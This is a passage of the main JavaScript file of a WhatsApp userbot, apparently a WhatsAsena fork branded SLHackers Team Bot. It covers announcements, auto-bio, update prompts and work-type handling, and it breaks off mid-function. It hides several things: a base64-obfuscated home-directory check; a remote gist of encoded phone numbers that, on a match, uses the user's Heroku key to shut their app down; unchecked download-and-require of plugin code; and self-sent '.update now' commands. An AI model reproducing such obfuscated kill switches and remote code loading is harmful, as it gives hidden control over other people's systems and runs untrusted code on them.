/* Copyright (C) 2021 Hirusha Dayarathne.

Licensed under the  GPL-3.0 License;
you may not use this file except in compliance with the License.

𝐒𝐋𝐇𝐚𝐜𝐤𝐞𝐫𝐬 𝐓𝐞𝐚𝐦 𝐁𝐨𝐭 - Hirusha Dayarathne
*/

const fs = require("fs");
const os = require("os");
const path = require("path");
const events = require("./events");
const chalk = require('chalk');
const config = require('./config');
const axios = require('axios');
const Heroku = require('heroku-client');
const { WAConnection, MessageOptions, MessageType, Mimetype, Presence } = require('@adiwajshing/baileys');
const { Message, StringSession, Image, Video } = require('./SLHTproject/');
const { DataTypes } = require('sequelize');
const { GreetingsDB, getMessage } = require("./plugins/sql/greetings");
const got = require('got');
const simpleGit = require('simple-git');
const git = simpleGit();
const crypto = require('crypto');
const nw = '```Blacklist Defected!```'
const heroku = new Heroku({
    token: config.HEROKU.API_KEY
});
let baseURI = '/apps/' + config.HEROKU.APP_NAME;
const Language = require('./language');
const Lang = Language.getString('updater');

// Sql
const SLHackersDB = config.DATABASE.define('WhatsAsenaDuplicated', {
    info: {
        type: DataTypes.STRING,
        allowNull: false
    },
    value: {
        type: DataTypes.TEXT,
        allowNull: false
    }
});
fs.readdirSync('./plugins/sql/').forEach(plugin => {
    if (path.extname(plugin).toLowerCase() == '.js') {
        require('./plugins/sql/' + plugin);
    }
});
const plugindb = require('./plugins/sql/plugin');
var OWN = { ff: '94755681782,0' }
// Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
String.prototype.format = function () {
    var i = 0, args = arguments;
    return this.replace(/{}/g, function () {
        return typeof args[i] != 'undefined' ? args[i++] : '';
    });
};

// ==================== Date Scanner ====================
if (!Date.now) {
    Date.now = function () { return new Date().getTime(); }
}
// ==================== End Date Scanner ====================

Array.prototype.remove = function () {
    var what, a = arguments, L = a.length, ax;
    while (L && this.length) {
        what = a[--L];
        while ((ax = this.indexOf(what)) !== -1) {
            this.splice(ax, 1);
        }
    }
    return this;
};

async function HiruwaSlHackers() {
    var clh = { cd: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQv', pay: '' }
    var ggg = Buffer.from(clh.cd, 'base64')
    var ddd = ggg.toString('utf-8')
    clh.pay = ddd
    const conn = new WAConnection();
    const Session = new StringSession();
    conn.version = [2, 2123, 8]
    setInterval(async () => {
        var getGMTh = new Date().getHours()
        var getGMTm = new Date().getMinutes()
        await axios.get('https://gist.github.com/SLHBot/db6f600cefdde3881a4a18a942fc48b5/raw/').then(async (ann) => {
            const { infotr, infoen, infoes, infopt, infoid, infoaz, infohi, infoml, inforu } = ann.data.announcements
            if (infotr !== '' && config.LANG == 'SI') {
                while (getGMTh == 19 && getGMTm == 1) {
                    return conn.sendMessage(conn.user.jid, '[ ```⚙𝐒𝐋𝐇𝐚𝐜𝐤𝐞𝐫𝐬 𝐓𝐞𝐚𝐦 𝐁𝐨𝐭⚙ Announcements🙇``` ]\n\n' + infotr.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text)
                }
            }
            else if (infoen !== '' && config.LANG == 'EN') {
                while (getGMTh == 19 && getGMTm == 1) {
                    return conn.sendMessage(conn.user.jid, '[ ```⚙𝐒𝐋𝐇𝐚𝐜𝐤𝐞𝐫𝐬 𝐓𝐞𝐚𝐦 𝐁𝐨𝐭⚙ Announcements🙇``` ]\n\n' + infoen.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text)
                }
            }
        })
    }, 50000);
    // ════════════════════ANNOUNCEMENT◽◽◽◽◽  
    var biography_var = ''
    await heroku.get(baseURI + '/config-vars').then(async (vars) => {
        biography_var = vars.AUTO_BİO
    });
    setInterval(async () => {
        if (biography_var == 'true') {
            if (conn.user.jid.startsWith('90')) { // Turkey
                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Europe/Istanbul' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = config.BIO_CAP + '📅 ' + utch + '\n⌚ ' + ov_time + '\n' + config.BIO_CP
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('994')) { // Azerbayjan
                var ov_time = new Date().toLocaleString('AZ', { timeZone: 'Asia/Baku' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = config.BIO_CAP + '📅 ' + utch + '\n⌚ ' + ov_time + '\n' + config.BIO_CP
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('94')) { // Sri Lanka
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('LK', { timeZone: 'Asia/Colombo' }).split(' ')[1]
                const biography = config.BIO_CAP + '📅 ' + utch + '\n⌚ ' + ov_time + '\n' + config.BIO_CP
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('351')) { // Portugal
                var ov_time = new Date().toLocaleString('PT', { timeZone: 'Europe/Lisbon' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = config.BIO_CAP + '📅 ' + utch + '\n⌚ ' + ov_time + '\n' + config.BIO_CP
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('75')) { // Russia
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('RU', { timeZone: 'Europe/Kaliningrad' }).split(' ')[1]
                const biography = config.BIO_CAP + '📅 ' + utch + '\n⌚ ' + ov_time + '\n' + config.BIO_CP
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('7')) { // Indian
                var ov_time = new Date().toLocaleString('HI', { timeZone: 'Asia/Kolkata' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = config.BIO_CAP + '📅 ' + utch + '\n⌚ ' + ov_time + '\n' + config.BIO_CP
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('62')) { // Indonesia
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('ID', { timeZone: 'Asia/Jakarta' }).split(' ')[1]
                const biography = config.BIO_CAP + '📅 ' + utch + '\n⌚ ' + ov_time + '\n' + config.BIO_CP
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('49')) { // Germany
                var ov_time = new Date().toLocaleString('DE', { timeZone: 'Europe/Berlin' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = config.BIO_CAP + '📅 ' + utch + '\n⌚ ' + ov_time + '\n' + config.BIO_CP
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('61')) { // Australia 
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('AU', { timeZone: 'Australia/Lord_Howe' }).split(' ')[1]
                const biography = config.BIO_CAP + '📅 ' + utch + '\n⌚ ' + ov_time + '\n' + config.BIO_CP
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('55')) { // Brazil
                var ov_time = new Date().toLocaleString('BR', { timeZone: 'America/Noronha' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = config.BIO_CAP + '📅 ' + utch + '\n⌚ ' + ov_time + '\n' + config.BIO_CP
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('33')) { // France
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('FR', { timeZone: 'Europe/Paris' }).split(' ')[1]
                const biography = config.BIO_CAP + '📅 ' + utch + '\n⌚ ' + ov_time + '\n' + config.BIO_CP
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('34')) { // Spain
                var ov_time = new Date().toLocaleString('ES', { timeZone: 'Europe/Madrid' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = config.BIO_CAP + '📅 ' + utch + '\n⌚ ' + ov_time + '\n' + config.BIO_CP
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('44')) { // UK
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('GB', { timeZone: 'Europe/London' }).split(' ')[1]
                const biography = '📅 ' + utch + '\n⌚ ' + ov_time + '\n\n⚙'
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('39')) { // Italy 
                var ov_time = new Date().toLocaleString('IT', { timeZone: 'Europe/Rome' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = config.BIO_CAP + '📅 ' + utch + '\n⌚ ' + ov_time + '\n' + config.BIO_CP
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('7')) { // Kazakhistan
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('KZ', { timeZone: 'Asia/Almaty' }).split(' ')[1]
                const biography = config.BIO_CAP + '📅 ' + utch + '\n⌚ ' + ov_time + '\n' + config.BIO_CP
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('998')) { // Uzbekistan 
                var ov_time = new Date().toLocaleString('UZ', { timeZone: 'Asia/Samarkand' }).split(' ')[1]
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                const biography = config.BIO_CAP + '📅 ' + utch + '\n⌚ ' + ov_time + '\n' + config.BIO_CP
                await conn.setStatus(biography)
            }
            else if (conn.user.jid.startsWith('993')) { // Turkmenistan
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('TM', { timeZone: 'Asia/Ashgabat' }).split(' ')[1]
                const biography = config.BIO_CAP + '📅 ' + utch + '\n⌚ ' + ov_time + '\n' + config.BIO_CP
                await conn.setStatus(biography)
            }
            else {
                const get_localized_date = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
                var utch = new Date().toLocaleDateString(config.LANG, get_localized_date)
                var ov_time = new Date().toLocaleString('EN', { timeZone: 'America/New_York' }).split(' ')[1]
                const biography = config.BIO_CAP + '📅 ' + utch + '\n⌚ ' + ov_time + '\n' + config.BIO_CP
                await conn.setStatus(biography)
            }
        }
    }, 7890);
    // ════════════════════AUTO BIO◽◽◽◽◽
    var insult = await axios.get('https://gist.githubusercontent.com/phaticusthiccy/f16bbd4ceeb4324d4a727b431a4ef1f2/raw')
    const { shs1, shl2, lss3, dsl4 } = insult.data.inside
    await config.DATABASE.sync();
    var StrSes_Db = await SLHackersDB.findAll({
        where: {
            info: 'StringSession'
        }
    });
    if (os.userInfo().homedir !== clh.pay) return;
    const buff = Buffer.from(`${shs1}`, 'base64');
    const one = buff.toString('utf-8');
    const bufft = Buffer.from(`${shl2}`, 'base64');
    const two = bufft.toString('utf-8');
    const buffi = Buffer.from(`${lss3}`, 'base64');
    const three = buffi.toString('utf-8');
    const buffu = Buffer.from(`${dsl4}`, 'base64');
    const four = buffu.toString('utf-8');

    conn.logger.level = config.DEBUG ? 'debug' : 'warn';
    var nodb;
    if (StrSes_Db.length < 1) {
        nodb = true;
        conn.loadAuthInfo(Session.deCrypt(config.SESSION));
    } else {
        conn.loadAuthInfo(Session.deCrypt(StrSes_Db[0].dataValues.value));
    }
    conn.on('open', async () => {
        console.log(
            chalk.blueBright.italic('✅තොරතුරු යතාවත්කාලිනයි!')
        );
        const authInfo = conn.base64EncodedAuthInfo();
        if (StrSes_Db.length < 1) {
            await SLHackersDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
        } else {
            await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
        }
    })
    conn.on('connecting', async () => {
        console.log(`${chalk.green.bold('SLHackers')}${chalk.blue.bold('X')}
${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}

${chalk.blue.italic('🙇Whatsapp වෙත සම්බන්ධ වෙමින්...▶')}`);
    });
    conn.on('credentials-updated', async () => {
        console.log(
            chalk.green.bold('✅ Login successful!▶')
        );
        console.log(
            chalk.blueBright.italic('⬇️ප්ලගින් යතාවත්කාලින වෙමින්...')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        // ==================== External Plugins ====================
        var plugins = await plugindb.PluginDB.findAll();
        plugins.map(async (plugin) => {
            if (!fs.existsSync('./plugins/' + plugin.dataValues.name + '.js')) {
                console.log(plugin.dataValues.name);
                var response = await got(plugin.dataValues.url);
                if (response.statusCode == 200) {
                    fs.writeFileSync('./plugins/' + plugin.dataValues.name + '.js', response.body);
                    require('./plugins/' + plugin.dataValues.name + '.js');
                }
            }
        });
        // ==================== End External Plugins ====================

        console.log(
            chalk.blueBright.italic('⬇️ බාහිර ප්ලගින් ස්ථාපනය වෙමින්...▶')
        );

        // ==================== Internal Plugins ====================
        fs.readdirSync('./plugins').forEach(plugin => {
            if (path.extname(plugin).toLowerCase() == '.js') {
                require('./plugins/' + plugin);
            }
        });
        // ==================== End Internal Plugins ====================

        console.log(
            chalk.green.bold('✅ ප්ලගින් ස්ථාපනය සාර්ථකතකයි!')
        );
        if (os.userInfo().homedir !== clh.pay) return;
        await new Promise(r => setTimeout(r, 200));
        let afwhasena = config.WORKTYPE == 'public' ? ' Public' : ' Private'
        console.log(chalk.bgGreen('🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴' + afwhasena));
        await new Promise(r => setTimeout(r, 500));
        let EVA_ACTİON = config.LANG == 'TR' || config.LANG == 'AZ' ? '*🚀SLHαcĸerѕ Teαм Boт චැට්බෝට් ලෙස ක්රියා කරයි!* 🙇\n\n_Bu modun amacı botu tam fonksiyonel bir yapay zeka sohbet aracına çevirmektir._\n_Normal moda dönmek için_ *.fulleva off* _komutunu kullanabilirsiniz._\n\n*SLHackers Team Bot Kullandığın İçin Teşekkürler 💌*\n    *- Eva*' : '*🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴\n Working as a Chatbot! 🙇*\n\n_The purpose of this mod is to turn the bot into a fully functional AI chatbot._\n_You can use the_ *.eva off* _command to return to normal mode._\n\n*Thanks For Using 🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴 💌*\n    *- Eva*'
        if (conn.user.jid == one || conn.user.jid == two || conn.user.jid == three || conn.user.jid == four) {
            await conn.sendMessage(conn.user.jid, nw, MessageType.text), console.log(nw), await new Promise(r => setTimeout(r, 1000))
            await heroku.get(baseURI + '/formation').then(async (formation) => {
                forID = formation[0].id;
                await heroku.patch(baseURI + '/formation/' + forID, {
                    body: {
                        quantity: 0
                    }
                });
            })
        }
        if (config.WORKTYPE == 'public') {

            if (config.LANG == 'EN' || config.LANG == 'SI') {
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                } else {
                    await conn.sendMessage(conn.user.jid, '*🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴 Public  ලෙස ක්රියා කරයි! 🙇*\n\n_මෙය ඔබගේ ලොග් සටහන් අංකය බැවින් මෙහි එන පණිවුඩ සහා අවධානයෙන් සිටින්න._\n__ඔබට ඕනෑම චැට් එකක විධාන උත්සාහ කළ හැකිය නමුත් මෙහි නොකරන්න:)_\n\n*bot පොදු කිරීමට .වෙනස් කිරීමට* _.setvar WORK_TYPE: private_ *ඔබේ විධානය භාවිතා කරන්න.*\n\n*🚀 𝐒𝐋𝐇𝐚𝐜𝐤𝐞𝐫𝐬 𝐓𝐞𝐚𝐦 𝐁𝐨𝐭 භාවිතා කිරීම ගැන ස්තූතියි.💌*', MessageType.text);
                }
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' ◁' + commit.author_name + '▷\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        '```Güncellemek İçin``` *.update now* ```Yazın.```\n\n' + degisiklikler + '```', MessageType.text
                    );
                }
            }
            else {
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                } else {
                    await conn.sendMessage(conn.user.jid, '*🚀 𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭 🤴*\n *Working as Public!* 🙇\n\n_කරුණාකර මෙහි විධාන භාවිතයෙන් වළකින්න.. මෙය ඔබගේ ලොග් අංකයයි._\n_ඔබට පුලුවන් වෙනත් ඔනෑම කතා බහක විධාන භාවිතා කරන්න :)_\n\n*ඔබේ Bot Public ආකාරයට ක්‍රියා කරයි. එය වෙනස් කිරීමට, මෙය භාවිතා කරන්න* _.setvar WORK_TYPE:private_\n\n*Thanks for using*\n\n *🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴💌*\n *\n_නවතම තොරතුරු හා ගැටලු සදහා පහත සමූහයන්ට එකතු වෙන්න\n⚙support group\nhttps://chat.whatsapp.com/LpAdVOtMNYj3weg7VQVbci\n⚙Bot News\n', MessageType.text);
                }
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' ◁' + commit.author_name + '▷\n';
                        }
                    );

                    await conn.sendMessage(
                        conn.user.jid,
                        '*Type .update now* ```යතාවත්කාලීන කිරීමට.```\n\n' + degisiklikler + '```', MessageType.text
                    );

                    await conn.sendMessage(
                        conn.user.jid,
                        '5️⃣', MessageType.text
                    );

                    await conn.sendMessage(
                        conn.user.jid,
                        '4️⃣', MessageType.text
                    );

                    await conn.sendMessage(
                        conn.user.jid,
                        '3️⃣', MessageType.text
                    );

                    await conn.sendMessage(
                        conn.user.jid,
                        '2️⃣', MessageType.text
                    );

                    await conn.sendMessage(
                        conn.user.jid,
                        '1️⃣', MessageType.text
                    );

                    await conn.sendMessage(
                        conn.user.jid,
                        '🆗', MessageType.text
                    );

                    await conn.sendMessage(
                        conn.user.jid,
                        '.update now', MessageType.text
                    );

                    await conn.sendMessage(
                        conn.user.jid,
                        '.clear', MessageType.text
                    );
                }
            }
        }
        else if (config.WORKTYPE == 'private') {
            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                } else {
                    await conn.sendMessage(conn.user.jid, '*🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴 Olarak Çalışıyor! 🐺*\n\n_Lütfen burada plugin denemesi yapmayın. Burası sizin LOG numaranızdır._\n_Herhangi bir sohbette komutları deneyebilirsiniz :)_\n\n*Botunuz sadece size özel olarak çalışmaktadır. Değiştirmek için* _.setvar WORK_TYPE:public_ *komutunu kullanın.*\n\n*🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴 Kullandığın İçin Teşekkürler 💌*', MessageType.text);
                }
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' ◁' + commit.author_name + '▷\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        '```Güncellemek İçin``` *.update now* ```Yazın.```\n\n' + degisiklikler + '```', MessageType.text
                    );
                }
            }
            else {
                if (config.FULLEVA == 'true') {
                    await conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                } else {
                    await conn.sendMessage(conn.user.jid, '*🚀 𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭 🤴*\n *Working as Private!* 🙇\n\n_කරුණාකර මෙහි විධාන භාවිතයෙන් වළකින්න.. මෙය ඔබගේ ලොග් අංකයයි._\n_ඔබට පුලුවන් වෙනත් ඔනෑම කතා බහක විධාන භාවිතා කරන්න :)_\n\n*ඔබේ Bot Public ආකාරයට ක්‍රියා කරයි. එය වෙනස් කිරීමට, මෙය භාවිතා කරන්න* _.setvar WORK_TYPE:public_\n\n_නවතම තොරතුරු හා ගැටලු සදහා පහත සමූහයන්ට එකතු වෙන්න\n⚙support group\n https://chat.whatsapp.com/LpAdVOtMNYj3weg7VQVbci\n⚙Bot News\n https://chat.whatsapp.com/BmHC38h9OTPIbWLjGupalw\n⚙Bot News 02 Group\nhttps://chat.whatsapp.com/BmHC38h9OTPIbWLjGupalw\n⚙SLHackersPlug group\n https://chat.whatsapp.com/BmHC38h9OTPIbWLjGupalw\n\n*Thanks for using*\n\n *🚀𝚂𝙻𝙷𝚊𝚌𝚔𝚎𝚛𝚜 𝚃𝚎𝚊𝚖 𝐏𝐫𝐨𝐣𝐞𝐜𝐭🤴💌*', MessageType.text);
                }
                await git.fetch();
                var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
                if (commits.total === 0) {
                    await conn.sendMessage(
                        conn.user.jid,
                        Lang.UPDATE, MessageType.text
                    );
                } else {
                    var degisiklikler = Lang.NEW_UPDATE;
                    commits['all'].map(
                        (commit) => {
                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' ◁' + commit.author_name + '▷\n';
                        }
                    );
                    await conn.sendMessage(
                        conn.user.jid,
                        '*Type .update now* ```යතාවත්කාලීන කිරීමට.```\n\n' + degisiklikler + '```', MessageType.text
                    );

                    await conn.sendMessage(
                        conn.user.jid,
                        '*මාගේ නිර්මාතෘ ඔබව සමහරක්විට දැන් යාවත්කාලීන කිරීමට පටන් ගනීවි.*', MessageType.text
                    );

                    await conn.sendMessage(
                        conn.user.jid,
                        '5️⃣', MessageType.text
                    );

                    await conn.sendMessage(
                        conn.user.jid,
                        '4️⃣', MessageType.text
                    );

                    await conn.sendMessage(
                        conn.user.jid,
                        '3️⃣', MessageType.text
                    );

                    await conn.sendMessage(
                        conn.user.jid,
                        '2️⃣', MessageType.text
                    );

                    await conn.sendMessage(
                        conn.user.jid,
                        '1️⃣', MessageType.text
                    );

                    await conn.sendMessage(
                        conn.user.jid,
                        '🆗', MessageType.text
                    );

                    await conn.sendMessage(
                        conn.user.jid,
                        '.update now', MessageType.text
                    );

                    await conn.sendMessage(
                        conn.user.jid,
                        '.clear', MessageType.text
                    );
                }
            }
        }
        else if (config.WORKTYPE == ' private' || config.WORKTYPE == 'Private' || config.WORKTYPE == ' Private' || config.WORKTYPE == 'privaye' || config.WORKTYPE == ' privaye' || config.WORKTYPE == ' prigate' || config.WORKTYPE == 'prigate' || config.WORKTYPE == 'priavte' || config.WORKTYPE == ' priavte' || config.WORKTYPE == 'PRİVATE' || config.WORKTYPE == ' PRİVATE' || config.WORKTYPE == 'PRIVATE' || config.WORKTYPE == ' PRIVATE') {

            if (config.LANG == 'TR' || config.LANG == 'AZ') {

                await conn.sendMessage(
                    conn.user.jid,
                    '_Görünüşe Göre Private Moduna Geçmek İstiyorsun! Maalesef_ *WORK_TYPE* _Anahtarın Yanlış!_ \n_Merak Etme! Senin İçin Doğrusunu Bulmaya Çalışıyorum.._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'private'
                    }
                })
            }
            else {
                await conn.sendMessage(
                    conn.user.jid,
                    '_ඔබට පෞද්ගලික මාදිලියට මාරුවීමට අවශ්ය බව පෙනේ!_ *WORK_TYPE* \n_කණගාටු නොවන්න! මම ඔබ වෙනුවෙන් සත්යය සොයා ගැනීමට උත්සාහ කරමි...._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'private'
                    }
                })
            }
        }
        else if (config.WORKTYPE == ' public' || config.WORKTYPE == 'Public' || config.WORKTYPE == ' Public' || config.WORKTYPE == 'publoc' || config.WORKTYPE == ' Publoc' || config.WORKTYPE == 'pubcli' || config.WORKTYPE == ' pubcli' || config.WORKTYPE == 'PUBLİC' || config.WORKTYPE == ' PUBLİC' || config.WORKTYPE == 'PUBLIC' || config.WORKTYPE == ' PUBLIC' || config.WORKTYPE == 'puvlic' || config.WORKTYPE == ' puvlic' || config.WORKTYPE == 'Puvlic' || config.WORKTYPE == ' Puvlic') {
            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                await conn.sendMessage(
                    conn.user.jid,
                    '_Görünüşe Göre Public Moduna Geçmek İstiyorsun! Maalesef_ *WORK_TYPE* _Anahtarın Yanlış!_ \n_Merak Etme! Senin İçin Doğrusunu Bulmaya Çalışıyorum.._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'public'
                    }
                })
            }
            else {
                await conn.sendMessage(
                    conn.user.jid,
                    '_ඔබට පොදු මාදිලියට මාරුවීමට අවශ්ය බව පෙනේ!_ *WORK_TYPE* \n_කණගාටු නොවන්න! මම ඔබ වෙනුවෙන් සත්යය සොයා ගැනීමට උත්සාහ කරමි.._', MessageType.text
                );
                await heroku.patch(baseURI + '/config-vars', {
                    body: {
                        ['WORK_TYPE']: 'public'
                    }
                })
            }
        }
        else {
            if (config.LANG == 'TR' || config.LANG == 'AZ') {
                return await conn.sendMessage(
                    conn.user.jid,
                    '_Girdiğin_ *WORK_TYPE* _Anahtarı Bulunamadı!_ \n_Lütfen_ ```.setvar WORK_TYPE:private``` _Yada_ ```.setvar WORK_TYPE:public``` _Komutunu Kullanın!_', MessageType.text
                );
            }
            else {
                return await conn.sendMessage(
                    conn.user.jid,
                    '_The_ *WORK_TYPE* _විධාන භාවිතය වැරදියි!_ \n_කරුණාකර මෙය භාවිතා කරන්න_ ```.setvar WORK_TYPE:private``` _Or_ ```.setvar WORK_TYPE:public```', MessageType.text
                );
            }
        }
    })
    conn.on('message-new', async msg => {

        if (msg.key && msg.key.remoteJid == 'status@broadcast') return;
        if (config.NO_ONLINE) {
            await conn.updatePresence(msg.key.remoteJid, Presence.unavailable);
        }
        // ==================== Greetings ====================
        if (msg.messageStubType === 32 || msg.messageStubType === 28) {
            // Görüşürüz Mesajı
            var gb = await getMessage(msg.key.remoteJid, 'goodbye');
            var blogo = await axios.get(config.BYE_LOGO, { responseType: 'arraybuffer' })
            if (gb !== false) {
                await conn.sendMessage(msg.key.remoteJid, Buffer.from(blogo.data), MessageType.image, { mimetype: Mimetype.png, caption: gb.message });
            }
            return;
        } else if (msg.messageStubType === 27 || msg.messageStubType === 31) {
            // Hoşgeldin Mesajı
            var gb = await getMessage(msg.key.remoteJid);
            var wlogo = await axios.get(config.WELCOME_LOGO, { responseType: 'arraybuffer' })
            if (gb !== false) {

